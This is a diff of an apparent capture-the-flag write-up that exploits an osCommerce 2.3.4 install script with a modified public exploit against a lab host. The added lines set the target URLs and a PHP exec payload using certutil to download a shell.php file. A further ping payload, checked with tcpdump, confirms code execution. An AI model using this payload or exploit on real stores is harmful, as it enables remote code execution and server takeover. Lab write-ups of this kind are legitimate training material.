@@ -17,18 +17,16 @@
 * ?
 * ?
 
-http://10.10.83.191:8080 --> takes us to the following website.
+Port 8080/tcp is open, it takes us to the following website.
 
 
 ![image](https://user-images.githubusercontent.com/99097743/170898695-0f88913c-e395-43be-a7f8-ded690c878f7.png)
 
-
-
-
+OSCommerce is an e-commerce and online store-management software program
 
 (Ref: https://en.wikipedia.org/wiki/OsCommerce)
 
-OSCommerce is an e-commerce and online store-management software program
+
 
 A quick **serchsploit** search on **osCommerce 2.3.4** shows the following vulnerabilities:
 
@@ -42,51 +40,32 @@ A quick **serchsploit** search on **osCommerce 2.3.4** shows the following vulne
 
 We need to update the followings inputs:
 
-1) base_url
-2) target_url
-3) Payload
+1) base_url: base_url = "http://10.10.83.191:8080/oscommerce-2.3.4/catalog/"
+2) target_url: target_url = "http://10.10.83.191:8080/oscommerce-2.3.4/catalog/install/install>
+3) Payload: payload += 'exec("certutil.exe -urlcache -f 10.10.83.191:8080/shell.php shell.p>
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-![image](https://user-images.githubusercontent.com/99097743/170891035-bec09bb0-bf5d-4d8d-99d1-4536bb19aaf0.png)
+![image](https://user-images.githubusercontent.com/99097743/170901248-239aad25-20dc-48a4-9e8d-b17b2190bffe.png)
 
 We need to launch the exploit:
 
 ```sh
   python ./44374_modified.py
   ```
-  
-  ![image](https://user-images.githubusercontent.com/99097743/170891095-908551f8-3745-40a3-b618-8c2f0616985f.png)
-  
+
+  ![image](https://user-images.githubusercontent.com/99097743/170891095-908551f8-3745-40a3-b618-8c2f0616985f.png)  
   This message means our code is injected but we need open the URL above in our browser to execute the code:
   
   ![image](https://user-images.githubusercontent.com/99097743/170891198-c029d698-81fc-4f52-bdf8-0db9b12d0dd4.png)
 
   
+  We can follow the steps below to check the output:
   
+  1) Change the paylod in the python script to a ping command for the localhost: **payload += 'exec("ping 10.18.123.93");'**
+  2) Open a tcpump session and capture the ICMP packages: **sudo tcpdump -i tun0 icmp**
+
+
+Great, the code is successfully getting executed! Now we need to work on the actual SHELL.PHP payload
 
   
 
